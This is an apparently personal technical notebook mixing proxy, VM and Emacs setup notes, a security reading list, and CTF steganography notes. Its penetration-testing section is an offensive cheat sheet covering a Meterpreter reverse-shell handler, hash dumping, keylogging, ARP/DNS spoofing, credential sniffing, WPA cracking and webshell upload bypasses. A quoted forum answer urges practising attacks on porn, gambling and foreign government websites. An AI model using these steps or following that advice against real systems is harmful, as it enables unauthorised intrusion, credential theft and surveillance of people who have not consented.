Please enter password for Shadowsocks-Go
(default password: teddysun.com):

password = teddysun.com

Please enter a port for Shadowsocks-Go [1-65535]
(default port: 8989):

port = 8989


Press any key to start...or Press Ctrl+C to cancel
安装成功后，命令行出现：
Congratulations, Shadowsocks-Go server install completed!
Your Server IP        :  45.32.73.59
Your Server Port      :  8989
Your Password         :  teddysun.com
Your Encryption Method:  aes-256-cfb

Welcome to visit: https://teddysun.com/486.html
Enjoy it!
（如果安装失败，请尝试其他脚本）
Chrome插件——SwitchyOmega
去chrome商场安装 SwitchyOmega插件。
配置代理
1.proxy模式（如图）：
代理协议：socks5
代理服务器：127.0.0.1 // 本地ip
代理端口：1080 // Shadowsocks客户端配置的代理端口

按左边的“应用选项”让配置生效。
2.auto switch模式
把需要代理的域名或网址，输入到条件中，情景模式选proxy（刚才配置的）；
默认情景模式，建议"直接连接"，意思是不配置条件的网址默认不代理。

在插件栏点击SwitchOmega，选"auto switch"

浏览 google.com
如果google能正常访问，证明你搭建Shadowsocks成功了！

Debian 9 (Stretch) 上部署 shadowsocks-libev 服务端并开启混淆
就个人看法来说，如果操作系统采用 Debian，无论是作为客户端还是服务端，使用 shadowsocks-libev 都是一种非常舒适流畅的体验。本文介绍如何在 Debian 系统中搭建 ss-libev 服务端。
注：以下的所有命令，都是针对 Debian 9 Stretch，并在 root 用户下执行的。
安装
添加 stretch-backports：
sh -c 'printf "deb http://deb.debian.org/debian stretch-backports main" > /etc/apt/sources.list.d/stretch-backports.list'

apt update
安装 shadowsocks-libev 和 simple-obfs：
apt -t stretch-backports install shadowsocks-libev simple-obfs -y
配置
编辑配置文件：
vim /etc/shadowsocks-libev/config-obfs.json
/etc/shadowsocks-libev/config-obfs.json
{
    "server":["::0","0.0.0.0"],
    "server_port":端口,
    "local_port":1080,
    "password":"密码",
    "timeout":60,
    "method":"aes-256-gcm",
    "mode":"tcp_and_udp",
    "fast_open":false,
    "plugin":"obfs-server",
    "plugin_opts":"obfs=http"
}
接下来，编辑 /etc/default/shadowsocks-libev 指定使用哪个配置文件，如下所示，更改了文件中 CONFFILE 的值（改成了 config-obfs.json ）：
vim /etc/default/shadowsocks-libev
/etc/default/shadowsocks-libev
# Defaults for shadowsocks initscript
# sourced by /etc/init.d/shadowsocks-libev
# installed at /etc/default/shadowsocks-libev by the maintainer scripts
#
# This is a POSIX shell fragment
#
# Note: `START', `GROUP' and `MAXFD' options are not recognized by systemd.
# Please change those settings in the corresponding systemd unit file.
# Enable during startup?
START=yes
# Configuration file
CONFFILE="/etc/shadowsocks-libev/config-obfs.json"
# Extra command line arguments
DAEMON_ARGS="-u"
# User and group to run the server as
USER=nobody
GROUP=nogroup
# Number of maximum file descriptors
MAXFD=32768
启动并检查
激活服务，以便开机自动启动：
systemctl enable shadowsocks-libev
启动服务：
systemctl start shadowsocks-libev
查看服务状态：
systemctl status shadowsocks-libev
至此，对服务端的部署配置愉快完成。
Debian 9 (Stretch) 上使用 shadowsocks-libev 客户端并开启混淆
本文介绍如何在 Debian 系统上使用 ss-libev 客户端。服务端部署教程见这里。
注：使用 simple-obfs 混淆时，请确认服务端同样开启了混淆功能。以下的所有命令，都是针对 Debian 9 Stretch，并在 root 用户下执行的。
安装
添加 stretch-backports：
sh -c 'printf "deb http://deb.debian.org/debian stretch-backports main" > /etc/apt/sources.list.d/stretch-backports.list'

apt update
安装 shadowsocks-libev 和 simple-obfs：
apt -t stretch-backports install shadowsocks-libev simple-obfs -y
配置
编辑配置文件：
vim /etc/shadowsocks-libev/config-obfs.json
/etc/shadowsocks-libev/config-obfs.json
{
    "server":"服务器地址",
    "server_port":端口,
    "local_port":1080,
    "password":"密码",
    "timeout":60,
    "method":"aes-256-gcm",
    "mode":"tcp_and_udp",
    "fast_open":false,
    "plugin":"obfs-local",
    "plugin_opts":"obfs=http;obfs-host=混淆用的域名"
}
启动并检查
激活服务，以便开机自动启动：
systemctl enable shadowsocks-libev-local@config-obfs
启动服务：
systemctl start shadowsocks-libev-local@config-obfs
查看服务状态：
systemctl status shadowsocks-libev-local@config-obfs
至此，对客户端的配置完成，代理服务在 localhost:1080 上。

*** vm
**** VMware
***** Install linux-header package
$ sudo apt-get install linux-headers-$(uname -r)
***** VMwaretools
apt install open-vm-tools
Procedure
On the host, from the Workstation Pro menu bar, select VM > Install VMware Tools.
If an earlier version of VMware Tools is installed, the menu item is Update VMware Tools.

In the virtual machine, log in to the guest operating system as root and open a terminal window.
Run the mount command with no arguments to determine whether your Linux distribution automatically mounted the VMware Tools virtual CD-ROM image.
If the CD-ROM device is mounted, the CD-ROM device and its mount point are listed as something like this:

 /dev/cdrom on /mnt/cdrom type iso9660 (ro,nosuid,nodev)
If the VMware Tools virtual CD-ROM image is not mounted, mount the CD-ROM drive.
If a mount point directory does not already exist, create it.
 mkdir /mnt/cdrom
Some Linux distributions use different mount point names. For example, on some distributions the mount point is /media/VMware Tools rather than /mnt/cdrom. Modify the command to reflect the conventions that your distribution uses.

Mount the CD-ROM drive.
 mount /dev/cdrom /mnt/cdrom
Some Linux distributions use different device names or organize the /dev directory differently. If your CD-ROM drive is not /dev/cdrom or if the mount point for a CD-ROM is not /mnt/cdrom, modify the command to reflect the conventions that your distribution uses.

Change to a working directory, for example, /tmp.
cd /tmp

Delete any previous vmware-tools-distrib directory before you install VMware Tools.
The location of this directory depends on where you placed it during the previous installation. Often this directory is placed in /tmp/vmware-tools-distrib.

List the contents of the mount point directory and note the filename of the VMware Tools tar installer.
 ls mount-point
Uncompress the installer.
 tar zxpf /mnt/cdrom/VMwareTools-x.x.x-yyyy.tar.gz
The value x.x.x is the product version number, and yyyy is the build number of the product release.

If you attempt to install a tar installation over an RPM installation, or the reverse, the installer detects the previous installation and must convert the installer database format before continuing.

If necessary, unmount the CD-ROM image.
 umount /dev/cdrom
If your Linux distribution automatically mounted the CD-ROM, you do not need to unmount the image.

Run the installer and configure VMware Tools.
 cd vmware-tools-distrib
./vmware-install.pl
Usually, the vmware-config-tools.pl configuration file runs after the installer file finishes running.

Follow the prompts to accept the default values, if appropriate for your configuration.
Follow the instructions at the end of the script.
Depending on the features you use, these instructions can include restarting the X session, restarting networking, logging in again, and starting the VMware User process. You can alternatively reboot the guest operating system to accomplish all these tasks.
Insall Workstation Pro from a Linux Host
sh  xx.bundle
Uninstall Workstation Pro from a Linux Host
vmware-installer -u vmware-workstation
**** virtualbox
virtualbox
kali linux 安装 virtualbox 遇到'modprobe vboxdrv'错误解决方法,reboot
apt-get install linux-headers-$(uname -r)
sh ./autorun.sh
reboot
sh ./VBoxLinuxAdditions-amd64.run
 挂载共享文件夹
mkdir /mnt/share
 mount -t vboxsf share /mnt/share
如果提示 /sbin/mount.vboxsf: mounting failed with the error: No such device
可能是没有载入内核模块 vboxfs ，先查看下：
#lsmod | grep vboxsf
如果没有结果返回，说明 vboxsf没有载入，执行
#sudo modprobe vboxsf
正常的话mount -t vboxsf winshare /mnt/share共享文件夹应该可以访问了
#cd /mnt/share
#ls -al
假如您不想每一次都手动挂载，可以在/etc/fstab中添加一项
share /mnt/share vboxsf rw,gid=100,uid=1000,auto 0 0
这样就能够自动挂载了。
本人这样做了，但是每次启动都挂接不上，因此使用以下方法，在系统启动时执行挂接脚本，成功自动挂接
#vi /etc/rc.d/rc.local
在文件的最后加入上面手动挂接的命令，比如：
mount -t vboxsf sharefolder /share
取消挂载
#sudo umount -f /mnt/shared

*** redhat
rhce rhcsa rhca
** network
*** cisco
ccna ccnp ccie
Todd Lammle-CCNA Routing and Switching Complete Study Guide_ Exam 100-105, Exam 200-105, Exam 200-125-Sybex (2016)
Implementing Cisco IP Routing (ROUTE) Foundation Learning Guide: (CCNP ROUTE 300-101) (Foundation Learning Guides)
Implementing Cisco IP Switched Networks(SWITCH)Foundation Learning Guide CCNP SWITCH 300-115
Troubleshooting and Maintaining Cisco IP Networks (TSHOOT) Foundation Learning Guide: (CCNP TSHOOT 300-135) (Foundation Learning
(Certification Guide) Narbik Kocharians, Terry Vinson-CCIE Routing and Switching v5.0 Official Cert Guide, Volume 2. 2_2-Cisco Press (2015)
[Certification Guide] Narbik Kocharians, Peter Palúch - CCIE Routing and Switching v5.0 Official Cert Guide, Volume 1 1_2(2015, Cisco Press).pdf

** database
** security
JBiFrost、China Chopper、Mimikatz、PowerShell Empire、HTran
*** books
计算机及系统原理
 《编码：隐匿在计算机软硬件背后的语言》 【美】Charles Petzold
 《深入理解计算机系统》【美】Randal E.Bryant
 《深入理解Windows操作系统》【美】Russinovich,M.E.；Solomon,D.A.
 《Linux内核设计与实现》【美】Robert Love
 《深入理解Android内核设计思想》林学森
 《Android系统源代码情景分析》罗升阳
 《深入理解Mac OS X & iOS操作系统》【美】Jonathan Levin
 《深入理解Linux内核》 【美】DanielP.Bovet
 《代码揭秘：从C/C++的角度探秘计算机系统》左飞
 《Android Dalvik虚拟机结构及机制剖析（第1、2卷）》吴艳霞；张国印
 《Android Internals::Power User's View》【美】Jonathan Levin，中文书名《最强Android书：架构大剖析》已上架
编程开发
系统平台
Windows
 《Windows程序设计》【美】Charles Petzold
 《Windows核心编程》【美】Jeffrey Richter
 《Windows环境下32位汇编语言程序设计》罗云彬
 《Windows驱动开发技术详解》张帆
Linux/Unix
 《UNIX环境高级编程》【美】W.Richard Stevens；Stephen A.Rago
 《Linux程序设计》【美】Neil Matthew；Richard Stones
 《鸟哥的Linux私房菜》鸟哥
 《Linux设备驱动程序》【美】Jonathan Corbet；Alessandro Rubini；Gerg Kroah-Hartman
macOS/iOS
 《iOS编程》【美】Christian Keur；Aaron Hillegass
 《OS X与iOS内核编程）【澳】Halvorsen,O.H.；Clarke,D
Android
 《第一行代码——Android》郭霖
 《Android编程权威指南》【美】Brian Hardy；BillPhillips
编程语言
C
 《C语言程序设计》【美】Brian W.Kernighan；Dennis M.Ritchie
 《C Primer Plus》【美】Stephen Prata，入门书籍
 《C和指针》【美】Kenneth A.Reek
 《C陷阱与缺陷》【美】Andrew Koenig
 《C专家编程》【美】Peter van der Linden
C++
 《C++ Primer Plus》【美】Stephen Prata，入门书籍
 《C++ Primer》【美】Stanley B.Lippman；Josée Lajoie；Barbara E.Moo，进阶书籍
ASM
 《Intel汇编语言程序设计》【美】Kip Irvine
 《Intel开发手册》
 《汇编语言（第3版）》王爽
 《x86汇编语言：从实模式到保护模式》李忠
Java
 《Java核心技术》【美】Cay S.Horstmann；Gary Cornell，入门书籍
 《Java 编程思想》【美】Bruce eckel，进阶书籍
JavaScript
 《JavaScript DOM编程艺术》【美】Jeremy Keith；【加】Jeffrey Sambells
 《JavaScript高级程序设计》【美】Zakas.Bicholas C.
Python
 《Python核心编程（第2版）》【美】Wesley JChun
Shell
 《Linux Shell脚本攻略》【印】Sarath Lakshman
调试技术
 《软件调试》张银奎
 《Debug Hacks》【日】吉冈弘隆；大和一洋；大岩尚宏；安部东洋；吉田俊辅
 《格蠹汇编：软件调试案例锦集》张银奎
数据结构与算法
 《数据结构与算法分析——C语言描述》【美】Mark Allen Weiss
 《算法导论》【美】Thomas H.Cormen；Chales E.Leiserson；Ronald l.Rivest
编译原理
 《编译系统透视：图解编译原理》新设计团队，入门书籍
 《编译原理》（龙书）【美】Alfered V.Aho；Monica S.Lam；Ravi Sehi；Jeffrey D.Ullmam
其他
 《编程高手箴言》梁肇新
 《代码整洁之道》【美】Robert C.Martin
 《代码大全》【美】Steve McConnell
网络技术
 《TCP/IP详解（卷1：协议）》【美】Kevin R.fall；W.Richard Stevens
 《Wireshark数据包分析实战》【美】Chris Sanders
安全技术
安全开发
 《天书夜读：从汇编语言到Windows内核编程》谭文；邵坚磊
 《Rootkit：系统灰色地带的潜伏者》【美】Bill Blunden
 《Rootkits——Windows内核的安全防护》【美】Gerg Hoglund；James Butler
 《BSD ROOTKIT设计——内核黑客指引书》【美】Joseph Kong
 《寒江独钓：Windows内核安全编程》谭文；杨潇；邵坚磊
逆向工程
 《恶意软件分析诀窍与工具箱——对抗“流氓”软件的技术与利器》【美】Michael Hale Ligh；Steven Adair
 《C++反汇编与逆向分析技术揭秘》钱林松；赵海旭
 《IDA权威指南》【美】Chris Eagle
 《逆向工程权威指南》【乌克兰】Dennis Yurichev，多平台入门大全
 《Android软件安全与逆向分析》丰生强
 《macOS软件安全与逆向分析》丰生强
 《iOS应用逆向工程（第2版）》沙梓社；吴航
Web安全
 《黑客攻防技术宝典：Web实战篇》【美】Marcus Pinto，Dafydd Stuttard
 《白帽子讲Web安全》吴翰清
 《Web安全测试》【美】Paco Hope；Ben Waltber
 《Web前端黑客技术揭秘》钟晨鸣；徐少培
 《精通脚本黑客》曾云好
软件/系统安全
 《0day安全：软件漏洞分析技术（第2版）》王清，入门书籍
 《漏洞战争：软件漏洞分析精要》林桠泉，进阶书籍
 《捉虫日记》【德】Tobias Klein，进阶书籍
 《黑客防线2009缓冲区溢出攻击与防范专辑》
 《内核漏洞的利用与防范》【美】Enrico Perla；Massimiliano Oldani
 《Fuzzing for Software Security Testing and Quality Assurance（第2版）》【美】Charlie Miller，博文视点翻译中
 《iOS Hackers's Handbook》【美】Charlie Miller，不推荐中文版
 《The Mac Hacker's Handbook》【美】Charlie Miller
 《Android安全攻防权威指南》【美】Joshua J.Drake；【西】Pau Oliva Fora；【美】Collin Mulliner
 《The Art of Softwar Security Assessment:Identifying and Preventing Software Vulnerabilities》【美】Mark Dowd
 《Android安全攻防实战》【美】Keith Makan；Scott Alexander-Bow
 《模糊测试-强制性安全漏洞挖掘》【美】Michael Mutton
 《Exploit编写系列教程》【美】Corelan Team
 《MacOS and iOS Internals,Volume Ⅲ: Security & Insecurity》【美】Jonathan Levin，博文视点翻译中，预计今年上市
 《灰帽黑客：正义黑客的道德规范、渗透测试、攻击方法和漏洞分析技术》【美】Allen Harper；Shon harris
 《威胁建模：设计和交付更安全的软件》【美】Adam Shostack
无线电安全
 《无线电安全攻防大揭秘》杨卿；黄琳
硬件安全
 《硬件安全攻防大揭秘》简云定，杨卿
汽车安全
 《智能汽车安全攻防大揭秘》李均；杨卿
 《汽车黑客大曝光》【美】Craig Smith
产品
 《人人都是产品经理》苏杰
运营
 《运营之光2.0：我的互联网运营方法论与自白》黄有璨
设计
 《写给大家看的设计书》【美】Robin Williams
 《听故事，学PPT设计》杨雪
软技能
 《软技能：代码之外的生存指南》【美】John Sonmez
 《程序员健康指南》【美】JoeKutner
 《影响力》【美】Robert B.Cialdini
 《穷爸爸富爸爸》【美】Robert Toru Kiyosaki
 《横向领导力》【美】Roger Fisher；Alan Sharpe
 《职业情商》张新越
 《程序员的成长课》安晓辉；周鹏
 《高效演讲：斯坦福最受欢迎的沟通课》【美】Peter Meyers；Shann Nix
 《程序员的英语》【韩】朴栽浒；李海永
 《思考，快与慢》【美】丹尼尔卡尼曼
 《少有人走的路》【美】斯科特派克
 《异类：不一样的成功启示录》【加】 马尔科姆格拉德威尔
 《见识》吴军
 《英语写作手册：风格的要素》【美】William Strunk
 《非暴力沟通》【美】马歇尔卢森堡
 《风格感觉：21世纪写作指南》【美】史蒂芬平克

*** kali
kali启动Apache Http的服务：
/etc/init.d/apache2 start
将写好的网页另存为index.html放进 /var/www 目录
*** spear phish
*** penetration testing
**** kali

1.信息搜集
DNS信息搜集，google,dns.txt暴力破解，whois，反向查询,命令dnsenum,dnsmap
路由信息搜集,tcptraceroute,tctrace
All-in-one智能搜集Maltego

2.扫描工具
主机发现，nmap,ping,arping,fping,genlist,hping3,nbtscan(MS hosts,NetBIOS),nping,onesixtyone(snmp),protos(router)
操作系统指纹,nmap,被动识别，p0f(Cisco IPS使用的),主动识别，xprobe2
端口扫描，nmap,netifera,autoscan,
服务探测,nmap,amap,httprint,httsquash
VPN探测,ike-scan,sslscan

3.漏洞发现
Nessus,AWVS
Cisco,Cisco Auditing Tools,Cisco Passwd Scanner,扫描Cisco routers
snmp,ADMsnmp,Snmp enum
http,Burp Suite,Grendel Scan,Nikto,W3AF,WafW00f(测试应用级防火墙)
SMB,Samrdump

4.社会工程学
Java Applet Attack Method,Social Engineering Toolkit,setoolkit(/usr/share/set),设置文件,自签名，证书，clone website,email fishing，swaks,木马，encoding，
Credential Harvester Attack Method，获取账号密码

5.运用层攻击MSF
Metasploit Framework

MSF在线攻击
db_nmap，存入MSF数据库
自动攻击，db_autopwn,sessions -i
sysinfo
copy hash,run hashdump,暴力破解账号密码，brute force,ophcrack(暴力破解Windows账号密码)
ps看系统进程,找管理员进程，exporer.exe,migrate pid
键盘记录keyscan start,keyscan dump，keyscan stop
远程桌面remote desktop，run getgui -e,useradd，run getgui -u user -p password，远程桌面连接，rdesktop destination ip:port

MSF离线攻击
msfpayload
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST ip
set LPORT port
exploit

6.局域网攻击
MAC泛洪攻击，MAC flooding attack,dsniff,macof
Yersinia,CDP,DHCP,DTP,HSRP,STP攻击
Arpspoof，启用主机路由功能，echo 1 > /proc/sys/net/ipv4/ip_forward,arpspoof -t ip1 ip2,arpspoof -t ip2 ip1,
Ettercap，ARP欺骗，DNS欺骗
ARP欺骗:
ettercap:
nano /usr/local/etc/etter.conf配置文件
Sniff > Unified sniffing > Network interface: eth0 > OK 设置抓包的网卡
Hosts > Scan for hosts (do this two times)扫描网段的主机
Hosts > Hosts list 显示主机列表
Select the default gateway > Add to Target 1 添加主机
Select the target > Add to Target 2 添加主机
Mitm > Arp poisoning > Sniff remote connections > OK 设置ARP攻击
Start > Start sniffing 开始攻击
dsniff -i eth0 监听网卡窃听登录用户密码
urlsnarf -i eth0 嗅探http请求
msgsnarf -i eth0 嗅探聊天软件的聊天内容
driftnet -i eth0 网络管理嗅探图片，音频。

dns欺骗:
nano /usr/local/share/ettercap/etter.dns编辑配置文件
Plugins > Manage the plugins > dns_spoof 设置dns欺骗
Mitm > Arp poisoning > Sniff remote connections > OK 设置ARP
Start > Start sniffing 开始攻击

7.密码破解
外接网卡（好像不用）
开始监控网卡，airmon-ng start wlan0
查看无线，airodump-ng -w filename mon0
改信道，airodump-ng -c ch  filename mon0
开始deauth攻击，aireplay-ng -0 ch  -a  apmac -c destinationmac mon0
出现WPA handshake字段
修改字典
通过字段破解WPA密码,aircrack-ng -w dictionary filename-*.cap
Cisco在线密码破解工具，ncrack -U userdic -v -P passwordic https://10.1.1.2

8.维持访问
DNS隧道
ping隧道
ssl隧道
proxy，3proxy
netcat,nc,制作后门，传文件，中继

tools,Metasploit Framework nmap awvs nessus sqlmap Cain&Abel IOS-Router dictionary
dvwa
扫描网站探 测CMS特征，/robots.txt
旁站
c段
内网
IIS6.0解析漏洞 windows server2003
IIS7.0，IIS7.5,windows server2008解析漏洞,Nginx<8.03,a.jpg/shell.php,a.jpg;.php
burpsuite抓包，改上传类型，加%00，复制%00，发送URL-decode，复制上传文件路径
webshell免杀，Encryption and decryption
Google Hacking
webshell提权，php用root，MS溢出，找可读可写可执行文件
远程桌面，连接超数，mstsc /admin /v:ip:port
访问目标网站
寻找上传点，访问上传路径，运行马
获取shell
提权Privilege Escalation
*** CRYPTOLOGY
1.密码
RAR
ASCII，BASE64，URL，MD5，HEX编码
MD5在线解密网址
比武常见加解密
凯撒密码，维吉尼亚密码（!KEY），摩尔斯电码，栅栏密码（一般字母不会太多，提示“栅栏”），BRAINFUCK，0OK
HTTP://TOOL.BUGKU.COM
ZIP
音频，MP3STEGO
视频，
WINHEX，WXHEXEDITOR，HEXDUMP

RAR,ZIP
压缩源文件数据区：
50 4B 03 04：这是头文件标记（0X04034B50）
14 00：解压文件所需 PKWARE 版本
00 00：全局方式位标记（有无加密）
08 00：压缩方式
5A 7E：最后修改文件时间
F7 46：最后修改文件日期
16 B5 80 14：CRC-32校验（1480B516）
19 00 00 00：压缩后尺寸（25）
17 00 00 00：未压缩尺寸（23）
07 00：文件名长度
00 00：扩展记录长度
6B65792E7478740BCECC750E71ABCE48CDC9C95728CECC2DC849AD284DAD0500
压缩源文件目录区：
50 4B 01 02：目录中文件文件头标记(0X02014B50)
3F 00：压缩使用的 PKWARE 版本
14 00：解压文件所需 PKWARE 版本
00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）
08 00：压缩方式
5A 7E：最后修改文件时间
F7 46：最后修改文件日期
16 B5 80 14：CRC-32校验（1480B516）
19 00 00 00：压缩后尺寸（25）
17 00 00 00：未压缩尺寸（23）
07 00：文件名长度
24 00：扩展字段长度
00 00：文件注释长度
00 00：磁盘开始号
00 00：内部文件属性
20 00 00 00：外部文件属性
00 00 00 00：局部头部偏移量
6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001
压缩源文件目录结束标志：
50 4B 05 06：目录结束标记
00 00：当前磁盘编号
00 00：目录区开始磁盘编号
01 00：本磁盘上纪录总数
01 00：目录区中纪录总数
59 00 00 00：目录区尺寸大小
3E 00 00 00：目录区对第一张磁盘的偏移量
00 00：ZIP 文件注释长度

2.图片隐写
基本属性，记事本打开，二维码，QR RESEARCH，
分层
BINWALK  DOCUMENT
DD IF=源文件   OF=新文件  SKIP=分离头   BS=1
FOREMOST  源文件

PNG改高度，十六进制，第二行为文件高度，适当改后出FLAG

3.数据类型改写
检查图像的开头标志和结束标志是否正确，若不正确修改 图像标志恢复图像
JPG图像开始标志：FF D8 结束标志 ：FF D9
GIF图像开始标志：47 49 46 38 39 61 (GIF89)结束标志：01 01 00 3B
BMP图片开始标志：42 4D //92 5B 54 00 00 00  00 00 结束标志：00
PNG图片开始标志：89 50 结束标志：

（固定）八个字节89 50 4E 47 0D 0A 1A 0A为PNG的文件头
（固定）四个字节00 00 00 0D（即为十进制的13）代表数据块的长度为13
（固定）四个字节49 48 44 52（即为ASCII码的IHDR）是文件头数据块的标示（IDCH） -
（可变）13位数据块（IHDR) - 前四个字节代表该图片的宽 - 后四个字节代表该图片的高 - 后五个字节依次为： BIT（第二行） DEPTH、COLORTYPE、COMPRESSION METHOD、FILTER METHOD、INTERLACE METHOD - （可变）剩余四字节为该PNG的CRC检验码，由从IDCH到IHDR的十七位字节进行CRC计算得到。


找表示宽度和高度的位置的话，可以先看看图片的属性，得到宽高值，转成16进制，搜索16进制值就找到了

4.算法隐写
F5算法隐写，KALI F5-STEGANOGRAPHY，文件复制到KALI下，   在KAIL下切换到F5-STEGANOGRAPHY，在JAVA EXTRACT运行
命令：JAVA EXTRACT 123456.JPG图片的绝对地址 -P 123456
判断是否为F5算法隐写

LSB算法隐写，STEGSOLVE对图像进行分通道扫描

GUESS算法隐写
在KAIL下切换到OUTGUESS目录下，直接用命令即可
命令:OUTGUESS -R /ROOT/ANGRYBIRD.JPG(绝对路径) 123.TXT(信息存放的文本)
OUTGUESS -K “MY SECRET KEY” -D HIDDEN.TXT DEMO.JPG OUT.JPG   # 隐藏
outguess -k “my secret key” -r out.jpg hidden.txt            #提取
四.工具使用
1.MP3stego
encode -E hidden_text.txt -P pass svega.wavsvega_stego.mp3
Decode.exe -X -P pass(密码) svega_stego.mp3(要拷贝到目录下) //解码
2.stedgetect
Stegdetect可以检测到通过JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX和Camouflage等这些隐写工具隐藏的信息
s – 修改检测算法的敏感度，该值的默认值为1。检测结果的匹配度与检测算法的敏感度成正比，算法敏感度的值越大，检测出的可疑文件包含敏感信息的可能性越大。
d – 打印带行号的调试信息。
t – 设置要检测哪些隐写工具（默认检测jopi），可设置的选项如下：
j – 检测图像中的信息是否是用jsteg嵌入的。
o – 检测图像中的信息是否是用outguess嵌入的。
p – 检测图像中的信息是否是用jphide嵌入的。
i – 检测图像中的信息是否是用invisible secrets嵌入的。
命令：stegdetect.exe -tjopi -s10.0 xxx.jpg
请求或响应中包含特定内容：http contains “flag”
*** web靶场
链接：https://www.zhihu.com/question/267204109/answer/320502511
来源：知乎
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。
一、前期
一系列的练习平台，大部分都有题解，实在十几天弄不出来可以看看题解。
SQL注入：RedTiger's Hackit
web:网络安全实验室|网络信息安全攻防学习平台
综合：[WeChall] Challenges
经典老平台：南京邮电大学网络攻防训练平台
综合性新平台：CTF - 练习平台
渗透：Penetration test lab
综合性黑客game：Game of Hacks
XCTF的训练平台：XCTF实训平台 | 登 录
I春秋的CTF复现平台：https://www.ichunqiu.com/racing/58837
安恒的平台：登录 - 明御® 攻防实验室
一个综合的新平台，貌似里面二进制的题挺好：Jarvis OJ
一个高端平台，里面有一些硬件、云安全、内网渗透的题：Exploit Exercises
又一个高端平台，里面有一些Oracle、密码学之类的题目：Under the Wire
渗透练习平台：https://pentest.training/mockexams.php
一个代码审计的平台（不是web方向，有很多都是C语言的审计，墙裂建议女装大佬来秒）：Websec
一个封装好的CTF平台：Vulnerable Docker VM - NotSoSecure
也是封装好的一些训练环境：Vulnerable By Design ~ VulnHub
PHP安全训练平台：PHP Security Advent Calendar 2017
一个国外的CTFwiki，质量好像一般:Forgotten Security’s CTF Wiki
一个和Metasploit配套的靶场---Metasploitable： http://downloads.metasploit.com/data/metasploitable/metasploitable-linux-2.0.0.zip
CTF工具库： CTF资源库|CTF工具下载|CTF工具包|CTF工具集合

以上是我自己整理的内容，同时推荐其它大佬的资源整理贴~
个人总结-网络安全学习和CTF必不可少的一些网站 - ida0918的博客 - CSDN博客


二、中期
打一些有奖金的CTF比赛，一些优质的CTF比赛还是比较贴近实战的，比如17年的HCTF
CTF时间表：
XCTF比赛的时间表：首页 - XCTF社区
大型比赛的时间表：All about CTF (Capture The Flag)
CTF指南：CTF Rank，你的CTF参赛指南
CTFwiki：墙裂推荐！CTF Wiki
2018年的CTF竞赛 2018·CTF·信息安全竞赛导航

一些CTF大佬的博客：
Hackfun - | Secblog | Pentest | Auditing | Sectool | CTF Write-up
Go0s @ 老 锥
Swing'Blog 有恨无人省
http://haojiawei.xyz/page/3/
pcat - 博客园
Si1ence's Blog - 雨一落，化开我眼中的冰，蔓延成河。
Medici.Yan's Blog
Radiation's blog
http://l-team.org/
Sebastian Neef - 0day.work
https://www.jimwilbur.com/
M4x - 博客园
当然，也不要仅仅局限于CTF比赛，多用docker去复现一些CVE环境，自己玩玩儿，再跟着P神学一下代码审计，不要拿到别人网站源码还不知道怎么getshell~一些闭源的cms，很容易审出洞。
这里在推荐一下p神的一个项目，用docker-compose去一键复现漏洞环境。
vulhub/vulhub首页 | 离别歌vulhub/vulhub

三、后期
那些刻意的环境已经满足不了你了，去实战吧
日常关注着漏洞预警：Exploits Database by Offensive Security
瞄准相关漏洞之后，用shodan去进行漏洞全球主机探测：Shodan Manual · GitBook
先知安全服务平台
漏洞银行(BUGBANK) 官方网站 | 全球领先的漏洞发现平台
补天 - 企业和白帽子共赢的漏洞响应平台，帮助企业建立SRC，库带计划 - 国内首个现金奖励漏洞平台
一些非法网站，比如黄网、赌博网站也可以用来练手，反正是它们也是违法的，但不要去谋取利益就好。
大陆政府的网站绝对不要碰。如果心痒痒就去搞国外zf的，因为他们的人也在搞咱们政府的练手。

*** tools
hexedit,wxHexEditor
** algorithms and data structures
** emacs
*** setup
git clone https://github.com/purcell/emacs.d.git ~/.emacs.d
fcitx安装以及在emacs中输入中文
2014-10-11T09:27:00
如何安装 GNU Emacs 25.1 在Ubuntu 16.04. Linux Ubuntu 的 GNU Emacs 文本编辑器是最受欢迎的 Emacs 文本编辑器. Emacs 是最古老和最多才多艺的文本编辑器可用于 Linux 和基于 UNIX 的系统之一. 它已经存在很长时间 (二十余年为 GNU emacs 的) 和是很出名的是其功能强大且丰富的编辑功能. 它是由 GNU 项目创始人理查德 · 斯托曼创建.
GNU EMACS 25.1
终于到达了 GNU Emacs 文本编辑器 25.1 释放昨晚. 这里是如何在 ubuntu 系统中安装它 16.04 和 Ubuntu 16.10.
Emacs的 25.1 发布亮点:
Emacs 现在可以加载共享/动态库 (模块)
开罗绘图的实验支持
增强的网络的安全 (TLS/SSL 证书的有效性和类似)
新小模式电-报价-模式使用弯的引号作为您键入
在 isearch.el 折叠支持的字符
Xwidgets: 一项新功能嵌入本机小部件里面 Emacs 缓冲区
新的和改进的设施，用于插入 Unicode 字符
安装GNU EMACS的 25.1 在 UBUNTU 中
在你安装 GNU Emacs 之前 25.1 在Ubuntu, 安装依赖使用下面的命令:
sudo apt install build-essential checkinstall
sudo apt-get build-dep emacs24
一旦安装了依赖项, 下载并安装 GNU Emacs 25.1 在Ubuntu 16.04, Ubuntu的 15.04, Ubuntu的 14.04 和其它 Ubuntu 衍生品:
sudo apt-get update
sudo wget http://ftp.gnu.org/gnu/emacs/emacs-25.1.tar.gz
sudo tar xzvf emacs-25.1.tar.gz
cd ~/Downloads/emacs-25.1
./configure
make
sudo checkinstall
一旦安装, Emacs 从 Ubuntu 破折号或打开运行命令 emacs 在终端来启动应用程序.
删除 EMACS
如果您想要卸载并删除 Emacs 从 Ubuntu 系统, 运行以下命令:
sudo dpkg -r emacs-25
fcitx安装以及在emacs中输入中文
安装步骤如下：
1：如果系统中有scim输入法的话，先进行卸载了，不然可能会和后面的fcitx的使用有冲突，卸载命令：

sudo apt-get remove scim
2：安装fcitx（安装前更新下源最好了），安装命令：

sudo apt-get update

sudo apt-get install fcitx
3：配置输入法：

1：在 etc/X11/Xsession.d/ 目录下，建立“95fcitx_start”文件，然后对其编辑，“sudo emacs /etc/X11/Xsession.d/95fcitx_start”，内容输入：

export LC_CTYPE=zh_CN.UTF-8

export XMODIFIERS=@im=fcitx

export XIM=fcitx

export XIM_PROGRAM=fcitx

fcitx
6.保存退出后，给该文件添加可执行权限，输入“sudo chmod +x /etc/X11/Xsession.d/95fcitx_start”

然后改下环境变量：sudo gedit~/.bashrc,在其中添加以下变量：

#fcitx
export XMODIFIERS="@im=fcitx"
export QT_IM MODULE=xim
